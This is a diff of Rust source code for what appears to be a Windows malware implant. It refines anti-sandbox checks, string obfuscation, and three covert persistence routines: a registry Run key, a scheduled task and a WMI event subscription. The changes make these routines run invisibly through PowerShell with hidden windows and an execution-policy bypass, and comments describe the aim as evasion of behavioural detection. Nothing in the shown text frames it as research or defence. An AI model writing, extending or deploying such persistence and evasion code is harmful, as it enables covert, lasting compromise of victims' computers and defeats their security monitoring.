@@ -6,8 +6,10 @@
 use std::process::Command;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
+#[cfg(target_os = "windows")]
 use std::env;
 use std::path::{Path, PathBuf};
+#[cfg(target_os = "windows")]
 use obfstr::obfstr;
 
 // Anti-sandbox constants
@@ -17,7 +19,9 @@ const MIN_CPU_CORES: usize = 2;
 const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes
 
 // File copy anti-signature constants
+#[cfg(target_os = "windows")]
 const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
+#[cfg(target_os = "windows")]
 const MAX_CHUNK_SIZE: usize = 24576;
 
 /// Métodos de persistencia disponibles
@@ -42,6 +46,7 @@ impl PersistenceMethod {
 }
 
 /// Verifica si la ruta actual es persistente y estable
+#[cfg(target_os = "windows")]
 fn is_persistent_location(path: &Path) -> bool {
     if let Some(path_str) = path.to_str() {
         let path_upper = path_str.to_uppercase();
@@ -55,6 +60,7 @@ fn is_persistent_location(path: &Path) -> bool {
 }
 
 /// Verifica si la ubicación es temporal/volátil
+#[cfg(target_os = "windows")]
 fn is_temporary_location(path: &Path) -> bool {
     if let Some(path_str) = path.to_str() {
         let path_upper = path_str.to_uppercase();
@@ -166,6 +172,7 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
 }
 
 /// Obtiene ruta del ejecutable en ubicación persistente
+#[cfg(target_os = "windows")]
 fn get_current_exe_path() -> Result<PathBuf, String> {
     let current_exe = env::current_exe()
         .map_err(|e| format!("E0: {}", e))?;
@@ -174,6 +181,7 @@ fn get_current_exe_path() -> Result<PathBuf, String> {
 
 /// Generate a pseudo-random index based on machine-specific data
 /// This ensures consistency per machine but variation across machines
+#[cfg(target_os = "windows")]
 fn get_machine_index() -> usize {
     let username = env::var("USERNAME").unwrap_or_default();
     let computername = env::var("COMPUTERNAME").unwrap_or_default();
@@ -190,6 +198,7 @@ fn get_machine_index() -> usize {
 }
 
 /// Registry Run persistence - método más simple y efectivo
+/// Uses direct executable path without cmd wrapper to avoid visible console
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -209,8 +218,10 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let idx = get_machine_index() % reg_names.len();
     let reg_name = reg_names[idx];
     
-    // Use cmd /c start /b for background, hidden execution
-    let obf_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
+    // Direct executable path - no cmd wrapper to avoid visible console window
+    // The agent should already be compiled as a Windows GUI app (not console)
+    // which means it won't show a window on startup
+    let exe_cmd = format!(r#""{}""#, exe_str);
     
     // Registry key path
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
@@ -222,7 +233,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
             &reg_key,
             "/v", reg_name,
             "/t", "REG_SZ",
-            "/d", &obf_cmd,
+            "/d", &exe_cmd,
             "/f",
         ])
         .creation_flags(0x08000000)
@@ -237,7 +248,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Scheduled Task persistence with enhanced evasion
-/// Uses delayed execution and background mode
+/// Uses PowerShell-based hidden task execution to avoid visible console windows
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -267,10 +278,12 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     // Random delay between 60-180 seconds for anti-behavioral detection
     let delay_secs = 60 + (get_machine_index() % 120);
     
-    // Task command with delay and hidden execution
+    // Use PowerShell with -WindowStyle Hidden to avoid visible console windows
+    // This creates a completely invisible execution
+    let ps_exe = obfstr!("powershell").to_string();
     let task_cmd = format!(
-        r#"cmd /c timeout /t {} /nobreak >nul && start /b "" "{}""#,
-        delay_secs, exe_str
+        r#"{} -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Sleep -Seconds {};Start-Process -FilePath '{}' -WindowStyle Hidden""#,
+        ps_exe, delay_secs, exe_str.replace("'", "''")
     );
     
     // Create scheduled task on logon with additional delay
@@ -297,6 +310,7 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 
 /// WMI Event Subscription persistence
 /// Uses time-based triggers which are less monitored than logon events
+/// Note: WMI persistence requires admin rights and may not work on all systems
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -312,31 +326,40 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let idx = get_machine_index() % wmi_names.len();
     let event_name = wmi_names[idx];
     
-    // Escape backslashes for PowerShell
+    // Escape backslashes for PowerShell command line template
     let exe_escaped = exe_str.replace("\\", "\\\\");
     
     // Random hour for trigger (less predictable)
     let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range
     
-    // Compact PowerShell WMI script
+    // Use raw string literals to avoid \r being interpreted as carriage return
+    // The WMI namespace path needs to be \\.\root\subscription in PowerShell
+    // Using string concatenation with raw strings to build the script
+    let wmi_root = r"\\.\root\subscription";
+    let cimv2_ns = r"root\cimv2";
+    
+    // Build PowerShell WMI script using raw strings for paths
+    // Use PowerShell Start-Process with -WindowStyle Hidden instead of cmd for execution
     let ps_script = format!(
         concat!(
-            "$F=([wmiclass]'\\\\.\root\\subscription:__EventFilter').CreateInstance();",
+            "$F=([wmiclass]'{}:__EventFilter').CreateInstance();",
             "$F.Name='{}';",
-            "$F.EventNamespace='root\\cimv2';",
+            "$F.EventNamespace='{}';",
             "$F.QueryLanguage='WQL';",
             "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
             "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
             "$F.Put()|Out-Null;",
-            "$C=([wmiclass]'\\\\.\root\\subscription:CommandLineEventConsumer').CreateInstance();",
+            "$C=([wmiclass]'{}:CommandLineEventConsumer').CreateInstance();",
             "$C.Name='{}';",
-            "$C.CommandLineTemplate='cmd /c start /b \"\" \"{}\"';",
+            "$C.CommandLineTemplate='powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process -FilePath \\\"{}\\\" -WindowStyle Hidden\"';",
             "$C.Put()|Out-Null;",
-            "$B=([wmiclass]'\\\\.\root\\subscription:__FilterToConsumerBinding').CreateInstance();",
+            "$B=([wmiclass]'{}:__FilterToConsumerBinding').CreateInstance();",
             "$B.Filter=$F;$B.Consumer=$C;",
             "$B.Put()|Out-Null"
         ),
-        event_name, trigger_hour, event_name, exe_escaped
+        wmi_root, event_name, cimv2_ns, trigger_hour,
+        wmi_root, event_name, exe_escaped,
+        wmi_root
     );
     
     let ps_exe = obfstr!("powershell").to_string();
